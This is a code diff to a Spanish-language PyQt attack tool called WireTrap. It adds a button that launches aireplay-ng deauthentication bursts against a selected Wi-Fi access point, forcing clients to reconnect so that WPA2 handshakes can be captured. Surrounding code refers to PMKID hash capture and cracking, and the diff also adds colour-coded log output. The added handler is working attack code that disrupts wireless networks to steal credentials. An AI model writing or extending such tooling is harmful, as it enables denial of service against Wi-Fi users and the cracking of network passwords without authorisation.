@@ -995,6 +995,12 @@ class WireTrap(QMainWindow):
         self.btn_wpa2_start.setFont(header_font)
         self.btn_wpa2_start.setStyleSheet("background-color: #00aa44; color: black; padding: 10px;")
         self.btn_wpa2_start.clicked.connect(self._start_wpa2_attack)
+
+        self.btn_wpa2_deauth = QPushButton("💥 FORZAR DEAUTH (HANDSHAKE)")
+        self.btn_wpa2_deauth.setFont(header_font)
+        self.btn_wpa2_deauth.setStyleSheet("background-color: #ffaa00; color: black; padding: 10px;")
+        self.btn_wpa2_deauth.setEnabled(False)
+        self.btn_wpa2_deauth.clicked.connect(self._on_wpa2_deauth_clicked)
         
         self.btn_wpa2_stop = QPushButton("🛑 DETENER CAZA")
         self.btn_wpa2_stop.setFont(header_font)
@@ -1003,6 +1009,7 @@ class WireTrap(QMainWindow):
         self.btn_wpa2_stop.clicked.connect(self._stop_wpa2_attack)
         
         btn_layout.addWidget(self.btn_wpa2_start)
+        btn_layout.addWidget(self.btn_wpa2_deauth)
         btn_layout.addWidget(self.btn_wpa2_stop)
         log_layout.addLayout(btn_layout)
 
@@ -1036,6 +1043,24 @@ class WireTrap(QMainWindow):
             
             self.wpa2_ap_table.setRowCount(0)
             self.selected_ap = None
+
+    def _on_wpa2_deauth_clicked(self):
+        """Lanza aireplay-ng contra la tabla completa (FF:FF:FF:FF:FF:FF) temporalmente"""
+        if not self.selected_ap: return
+        iface = self.wpa2_iface_combo.currentText()
+        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando clientes temporalmente de {self.selected_ap.bssid} para forzar re-asociaciones...")
+        
+        def run_deauth():
+            import subprocess
+            try:
+                subprocess.run([
+                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, iface
+                ], capture_output=True, timeout=10)
+            except Exception as e:
+                pass
+                
+        import threading
+        threading.Thread(target=run_deauth, daemon=True).start()
 
     def _on_wpa2_ap_selected(self):
         row = self.wpa2_ap_table.currentRow()
@@ -1071,6 +1096,7 @@ class WireTrap(QMainWindow):
         self.wpa2_status.setStyleSheet("color: #e94560; font-weight: bold;")
         self.btn_wpa2_start.setEnabled(False)
         self.btn_wpa2_stop.setEnabled(True)
+        self.btn_wpa2_deauth.setEnabled(True)
 
     def _stop_wpa2_attack(self):
         if self.wpa2_engine:
@@ -1079,6 +1105,7 @@ class WireTrap(QMainWindow):
         self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
         self.btn_wpa2_start.setEnabled(True)
         self.btn_wpa2_stop.setEnabled(False)
+        self.btn_wpa2_deauth.setEnabled(False)
 
     def _on_pmkid_success(self, file_path):
         self.log_wpa2(f"🏆 ¡Hash procesado con éxito!")
@@ -1086,6 +1113,7 @@ class WireTrap(QMainWindow):
         self.wpa2_status.setText("● CRACKEANDO")
         self.wpa2_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
         self.btn_wpa2_stop.setEnabled(False)
+        self.btn_wpa2_deauth.setEnabled(False)
 
     def _on_pmkid_error(self, error):
         self.log_wpa2(f"❌ Error crítico: {error}")
@@ -1093,8 +1121,17 @@ class WireTrap(QMainWindow):
 
     def log_wpa2(self, msg):
         import datetime
+        import html
         ts = datetime.datetime.now().strftime("%H:%M:%S")
-        self.wpa2_log_text.append(f"[{ts}] {msg}")
+        safe_msg = html.escape(msg)
+        if "error" in msg.lower():
+            self.wpa2_log_text.append(f"<span style='color: #ff3333;'>[{ts}] {safe_msg}</span>")
+        elif "💥" in msg or "ráfaga" in msg.lower():
+            self.wpa2_log_text.append(f"<span style='color: #ffaa00;'>[{ts}] {safe_msg}</span>")
+        elif "🏆" in msg or "éxito" in msg.lower():
+            self.wpa2_log_text.append(f"<span style='color: #00ffff;'>[{ts}] {safe_msg}</span>")
+        else:
+            self.wpa2_log_text.append(f"<span style='color: #00ff00;'>[{ts}] {safe_msg}</span>")
 
     # ── MÓDULOS DEL ESCÁNER ───────────────────────────────────
 
